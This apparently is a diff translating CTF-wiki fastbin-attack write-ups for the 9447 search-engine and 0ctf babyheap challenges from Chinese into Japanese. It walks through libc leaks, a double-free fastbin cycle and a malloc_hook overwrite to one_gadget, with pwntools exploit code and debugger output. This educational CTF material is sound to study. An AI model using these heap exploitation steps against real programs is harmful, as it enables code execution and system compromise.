-- 分配 chunk 到 malloc_hook 附近，修改malloc_hook 为 one_gadget
+- unsorted bin のアドレスを利用して libc のベースアドレスを leak する
+- double free を利用して fastbin の循環リストを作る
+- chunk を malloc_hook の付近に割り当て、malloc_hook を one_gadget に書き換える
 
-#### 泄漏 libc 地址
+#### libc アドレスの leak
 
-这里我们分配一个 small bin 大小的 chunk ，当它被释放后，就会放入到 unsorted bin 中。因而，只要 `unsorted bin` 的地址的起始字节不是 `\x00` 便可以通过验证。同时，我们可以构造 `\x00` 来进行比较，从而通过验证。具体如下
+ここでは small bin サイズの chunk を確保します。これが解放されると unsorted bin に入ります。したがって、`unsorted bin` のアドレスの先頭バイトが `\x00` でなければ、検証を通過できます。また、`\x00` を作って比較することでも、検証を通過できます。具体的には次のとおりです。
 
 ```python
 def leak_libc():
@@ -876,15 +876,15 @@ def leak_libc():
     return unsortedbin_addr
 ```
 
-#### 构造 fastbin 循环链表
+#### fastbin 循環リストの構築
 
-由于我们最后希望在 malloc_hook 处分配 chunk，而一般分配 malloc_hook 附近的 chunk 一般大小都是0x7f。即，我们所需要设置的设置的 fast bin 的数据字节部分的大小为 0x60。这里我们按照如下方式构造
+最終的に malloc_hook の位置に chunk を割り当てたく、malloc_hook の付近の chunk のサイズは一般に 0x7f になります。つまり、設定する必要のある fast bin のデータバイト部分のサイズは 0x60 です。ここでは次の方法で構築します。
 
-1. 分别索引句子a，索引句子b，索引句子c，则此时单词链表中索引的句子的相对顺序为c->b->a。假设句子 a 为'a' * 0x5d+' d '，句子 b 为 'b' * 0x5d+' d '，句子c类似。
-2. 索引单词d，三个均删除，则此时 fastbin 中的链表情况为 a->b->c->NULL，这是因为首先释放的是句子c，最后释放的是句子 a 。这时，搜索单词时`*i->sentence_ptr` 对于a, b 来说都是可以绕过的。
-3. 我们此时再次删除搜索单词 `\x00`。首先遍历的是 c，但是 c 的验证不通过；其次遍历的是b，验证通过，我们将其释放；其次遍历的是a，验证通过，但是我们不删除。则此时 fastbin 的情况为 b->a->b->a->...。即已经构成了double free b的情况。由于我们先前为了 leak libc 还建立一个句子，所以还有一个单词可以比较，这里我们也不删除。
+1. 文 a、文 b、文 c を順に索引に追加すると、このとき単語リストに索引された文の相対的な順序は c->b->a になります。文 a は 'a' * 0x5d+' d '、文 b は 'b' * 0x5d+' d '、文 c も同様とします。
+2. 単語 d を索引に追加し、3つとも削除します。すると fastbin のリストの状態は a->b->c->NULL になります。これは、最初に解放されるのが文 c で、最後に解放されるのが文 a だからです。このとき、単語を検索する際の `*i->sentence_ptr` は、a と b については回避できます。
+3. ここで再び単語 `\x00` の検索削除を行います。最初にたどるのは c ですが、c の検証は通りません。次にたどるのは b で、検証が通るので解放します。その次にたどるのは a で、検証は通りますが、削除しません。すると fastbin の状態は b->a->b->a->... になります。つまり b の double free が成立しています。先に libc の leak のために文を1つ作成してあるため、比較できる単語がもう1つありますが、これも削除しません。
 
-具体代码如下
+具体的なコードは次のとおりです。
 
 ```python
     # 2. create cycle fastbin 0x70 size
@@ -911,7 +911,7 @@ def leak_libc():
     p.sendline('n')
 ```
 
-效果如下
+結果は次のとおりです。
 
 ```shell
 pwndbg> fastbins
@@ -925,9 +925,9 @@ fastbins
 0x80: 0x0
 ```
 
-#### 分配 malloc_hook 附近chunk
+#### malloc_hook 付近への chunk の割り当て
 
-此时，fastbin 的链表为 b->a->b->a->…，则我们可以在申请第一个相同大小的 chunk 时，设置 b 的 fd 为 malloc_hook 附近处的 chunk `0x7fd798586aed`（这里是举一个例子，代码中需使用相对地址）。
+このとき、fastbin のリストは b->a->b->a->… なので、同じサイズの chunk を最初に確保するとき、b の fd を malloc_hook 付近の chunk `0x7fd798586aed` に設定できます(これは一例で、コードでは相対アドレスを使う必要があります)。
 
 ```shell
 pwndbg> print (void*)&main_arena
@@ -954,7 +954,7 @@ $3 = 0x33
 
 ```
 
-那么当再次分配 b 的时候，由于此时 b 的 fd 已经被我们修改为了malloc_hook附近的地址，所以这时候我们再次分配一个 chunk，就会指向 `0x7fd798586aed`。 此后便只需要将 malloc_hook 修改为 one_gadget 地址就可以拿到 shell 了。
+その後 b を再び割り当てるとき、b の fd はすでに malloc_hook 付近のアドレスに書き換えられているため、もう一度 chunk を割り当てると `0x7fd798586aed` を指すことになります。あとは malloc_hook を one_gadget のアドレスに書き換えれば shell が取れます。
 
 ```python
     # 3. fastbin attack to malloc_hook nearby chunk
@@ -975,7 +975,7 @@ $3 = 0x33
     p.interactive()
 ```
 
-这里可能需要多选择几个 one_gadget 地址，因为 one_gadget 成功是有条件的。
+ここでは、one_gadget のアドレスを複数選んで試す必要があるかもしれません。one_gadget の成功には条件があるためです。
 
 #### shell
 
@@ -999,12 +999,12 @@ exp.py       search      search.id1  search.nam
 libc.so.6  search.id0  search.id2  search.til
 ```
 
-当然，这里还有一种[方法](https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/)，将 chunk 分配到栈上。
+もちろん、ここには chunk をスタックに割り当てる別の[方法](https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/)もあります。
 
 ## 2017 0ctf babyheap
-[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/fastbin-attack/2017_0ctf_babyheap)
+[問題へのリンク](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/fastbin-attack/2017_0ctf_babyheap)
 
-### 基本信息
+### 基本情報
 
 ```shell
 ➜  2017_0ctf_babyheap git:(master) file babyheap
@@ -1018,11 +1018,11 @@ babyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically li
     PIE:      PIE enabled
 ```
 
-64位程序，保护全部开启。
+64ビットのプログラムで、保護はすべて有効です。
 
-### 基本功能
+### 基本機能
 
-程序是一个堆分配器，主要由以下四种功能
+プログラムはヒープアロケータで、主に次の4つの機能があります。
 
 ```c
   puts("1. Allocate");
@@ -1033,9 +1033,9 @@ babyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically li
   return printf("Command: ");
 ```
 
-其中，每次读取命令的函数由读取指定长度的字符串的函数而决定。
+このうち、コマンドを読み込む関数は、指定した長さの文字列を読み込む関数によって決まります。
 
-通过分配函数
+割り当て関数から、
 
 ```c
 void __fastcall allocate(__int64 a1)
@@ -1068,7 +1068,7 @@ void __fastcall allocate(__int64 a1)
 }
 ```
 
-申请的 chunk 的最大为 4096。此外，我们可以看出每个 chunk 主要有三个字段：是否在使用，堆块大小，堆块位置。故而我们可以创建对应的结构体。
+確保する chunk の最大は 4096 です。また、各 chunk には主に3つのフィールド(使用中かどうか、ヒープブロックのサイズ、ヒープブロックの位置)があることが分かります。そのため、対応する構造体を作れます。
 
 ```
 00000000 chunk           struc ; (sizeof=0x18, mappedto_6)
@@ -1078,9 +1078,9 @@ void __fastcall allocate(__int64 a1)
 00000018 chunk           ends
 ```
 
-**需要注意的是堆块是由 calloc 分配的，所以 chunk 中的内容全都为`\x00`。**
+**注意:ヒープブロックは calloc で確保されるため、chunk の中身はすべて `\x00` です。**
 
-在填充内容的功能中，使用读取内容的函数是直接读取指定长度的内容，并没有设置字符串结尾。**而且比较有意思的是，这个指定长度是我们指定的，并不是之前 chunk 分配时指定的长度，所以这里就出现了任意堆溢出的情形。**
+内容を埋める機能では、内容を読み込む関数は指定した長さの内容をそのまま読み込み、文字列の終端を設定していません。**しかも興味深いことに、この指定長は私たちが指定するもので、以前に chunk を割り当てたときに指定した長さではないため、任意のヒープオーバーフローの状況が生じます。**
 
 ```c
 __int64 __fastcall fill(chunk *a1)
@@ -1111,7 +1111,7 @@ __int64 __fastcall fill(chunk *a1)
 }
 ```
 
-在释放chunk的功能中该设置的都设置了。
+chunk を解放する機能では、設定すべきものはすべて設定されています。
 
 ```c
 __int64 __fastcall free_chunk(chunk *a1)
@@ -1138,18 +1138,18 @@ __int64 __fastcall free_chunk(chunk *a1)
 }
 ```
 
-dump 就是输出对应索引 chunk 的内容。
+dump は、対応する添字の chunk の内容を出力します。
 
-### 利用思路
+### 攻撃の考え方
 
-可以确定的是，我们主要有的漏洞就是任意长度堆溢出。由于该程序几乎所有保护都开启了，所以我们必须要有一些泄漏才可以控制程序的流程。基本利用思路如下
+確実に言えるのは、主な脆弱性が任意の長さのヒープオーバーフローだということです。このプログラムはほとんどすべての保護が有効なので、プログラムのフローを制御するには何らかの leak が必要です。基本的な攻撃の考え方は次のとおりです。
 
-- 利用 unsorted bin 地址泄漏 libc 基地址。
-- 利用 fastbin attack 将chunk 分配到 malloc_hook 附近。
+- unsorted bin のアドレスを利用して libc のベースアドレスを leak する。
+- fastbin attack を利用して chunk を malloc_hook の付近に割り当てる。
 
-#### 泄漏 libc 基地址
+#### libc ベースアドレスの leak
 
-由于我们是希望使用 unsorted bin 来泄漏 libc 基地址，所以必须要有 chunk 可以被链接到 unsorted bin 中，所以该 chunk 不能使 fastbin chunk，也不能和 top chunk 相邻。因为前者会被添加到 fastbin 中，后者在不是fastbin 的情况下，会被合并到 top chunk 中。因此，我们这里构造一个 small bin chunk。在将该 chunk 释放到 unsorted bin 的同时，也需要让另外一个正在使用的 chunk 可以同时指向该 chunk 的位置。这样才可以进行泄漏。具体设计如下
+unsorted bin を使って libc のベースアドレスを leak したいので、unsorted bin につなげられる chunk が必要です。したがって、その chunk は fastbin chunk であってはならず、top chunk と隣接していてもいけません。前者は fastbin に追加され、後者は fastbin でない場合に top chunk へ統合されてしまうからです。そこで、ここでは small bin の chunk を作ります。この chunk を unsorted bin に解放すると同時に、使用中のもう1つの chunk がその chunk の位置を同時に指すようにする必要があります。そうして初めて leak できます。具体的な設計は次のとおりです。
 
 ```Python
     # 1. leak libc base
@@ -1163,7 +1163,7 @@ dump 就是输出对应索引 chunk 的内容。
     free(1)
 ```
 
-首先，我们申请了 5 个chunk，并释放了两个chunk，此时堆的情况如下。
+まず 5 つの chunk を確保し、2 つの chunk を解放します。このときのヒープの状況は次のとおりです。
 
 ```shell
 pwndbg> x/20gx 0x55a03ca22000
@@ -1189,7 +1189,7 @@ fastbins
 
 ```
 
-当我们编辑 idx0 后，确实已经将其指向idx4了。这里之所以可以成功是因为堆的始终是 4KB 对齐的，所以idx 4的起始地址的第一个字节必然是0x80。
+idx0 を編集すると、確かに idx4 を指すようになっています。ここで成功するのは、ヒープが常に 4KB でアライメントされているため、idx 4 の開始アドレスの最初のバイトが必ず 0x80 になるからです。
 
 ```python
     # edit idx 0 chunk to particial overwrite idx1's fd to point to idx4
@@ -1197,7 +1197,7 @@ fastbins
     fill(0, len(payload), payload)
 ```
 
-修改成功后如下
+修正に成功した後は次のとおりです。
 
 ```shell
 pwndbg> x/20gx 0x55a03ca22000
@@ -1222,7 +1222,7 @@ fastbins
 0x80: 0x0
 ```
 
-那么，当我们再次申请两个时，第二个申请到的就是idx 4处的chunk。为了能够申请成功，我们需要确保 idx4 的size 与当前 fastbin 的大小一致，所以，我们得修改它的大小。申请成功后，idx2会指向idx4。
+その後、再び2つ確保すると、2番目に確保されるのは idx 4 の chunk です。確保に成功させるには、idx4 の size が現在の fastbin のサイズと一致していることを保証する必要があるため、そのサイズを変更しなければなりません。確保に成功すると、idx2 が idx4 を指すようになります。
 
 ```python
     # if we want to allocate at idx4, we must set it's size as 0x21
@@ -1232,7 +1232,7 @@ fastbins
     allocate(0x10)  # idx 2, which point to idx4's location
 ```
 
-之后，如果我们想要将 idx 4 放到 unsorted bin 中的话，为了防止其与top chunk 合并，我们需要再次申请一个chunk。此后再释放 idx4 就会进入 unsorted bin中去了。此时由于 idx2 也指向这个地址，所以我们直接展示他的内容就可以得到unsorted bin的地址了。
+その後、idx 4 を unsorted bin に入れたい場合、top chunk と統合されるのを防ぐため、もう1つ chunk を確保する必要があります。その後で idx4 を解放すると unsorted bin に入ります。このとき idx2 もこのアドレスを指しているため、その内容をそのまま表示すれば unsorted bin のアドレスを得られます。
 
 ```python
     # if want to free idx4 to unsorted bin, we must fix its size
@@ -1252,9 +1252,9 @@ fastbins
     log.success('libc base addr: ' + hex(libc_base))
 ```
 
-#### 分配chunk到malloc_hook附近
+#### chunk を malloc_hook の付近に割り当てる
 
-由于 malloc hook 附近的 chunk 大小为 0x7f，所以数据区域为0x60。这里我们再次申请的时候，对应 fastbin 链表中没有相应大小chunk，所以根据堆分配器规则，它会依次处理unsorted bin中的chunk，将其放入到对应的bin中，之后会再次尝试分配 chunk，因为之前释放的 chunk 比当前申请的 chunk 大，所以可以从其前面分割出来一块。所以 idx2 仍然指向该位置，那么我们可以使用类似的办法先释放申请到的chunk，然后再次修改 fd 指针为 fake chunk 即可。此后我们修改 malloc_hook 处的指针即可得到触发 onegadget。
+malloc hook 付近の chunk のサイズは 0x7f なので、データ領域は 0x60 です。ここで再び確保するとき、対応する fastbin のリストには該当サイズの chunk がないため、ヒープアロケータの規則に従い、unsorted bin 内の chunk を順に処理して対応する bin に入れ、その後あらためて chunk の割り当てを試みます。先に解放した chunk は今回確保する chunk より大きいので、その前方から1ブロックを切り出せます。したがって idx2 は引き続きその位置を指します。そこで、同様の方法で、まず確保した chunk を解放し、その後 fd ポインタを fake chunk に書き換えれば済みます。その後、malloc_hook のポインタを書き換えれば onegadget を発動できます。
 
 ```Python
 # 2. malloc to malloc_hook nearby
@@ -1276,9 +1276,9 @@ fill(6, len(payload), payload)
 allocate(0x100)
 p.interactive()
 ```
-同时，这里的 onegadget 地址也可能需要尝试多次。
+ここでも onegadget のアドレスを何度か試す必要があるかもしれません。
 
-## 题目
+## 問題
 
 - L-CTF2016–pwn200
 
